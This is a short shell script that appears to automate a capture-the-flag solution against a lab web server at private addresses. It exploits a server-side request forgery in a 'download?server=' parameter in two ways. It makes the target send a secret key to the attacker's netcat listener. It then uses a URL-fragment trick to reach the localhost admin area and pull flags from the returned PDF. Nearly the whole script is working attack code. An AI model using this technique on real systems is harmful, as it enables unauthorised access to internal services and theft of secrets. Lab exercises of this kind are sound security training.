#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.68.196"
attack_ip="10.10.190.240"

# Prepare environment
mkdir /work/ 2>/dev/null

# Initiate session
echo "1 - INITIATING SESSION"
curl -s -X GET "http://$target_ip:8087" -L > /dev/null

# Tweak the server into downloading resume from our attack box
echo "2 - RETRIEVING SECRET KEY"
rm /work/10-nc-log.txt
sudo mate-terminal -- bash -c "nc -lvnp 8087 | tee /work/10-nc-log.txt; exec bash" &
sleep 3
curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=75482342" &
sleep 1
echo "--> Flag is : $(awk 'BEGIN { RS=":"; FS="\n" } { print $2}' /work/10-nc-log.txt)"

# Access site admin area
echo "3 - ACCESSING ADMIN AREA"
# We add # in the url, so that the remaining of the url is interpreted as a fragment. The fragment is not found, but the webpage is still displayed
curl -s -X GET "http://$target_ip:8087/download?server=localhost:8087/admin%23&id=75482342" -o /work/10-admin.pdf
pdftotext /work/10-admin.pdf /work/10-admin.txt
echo "--> Flag is : $(head -1 /work/10-admin.txt)" 
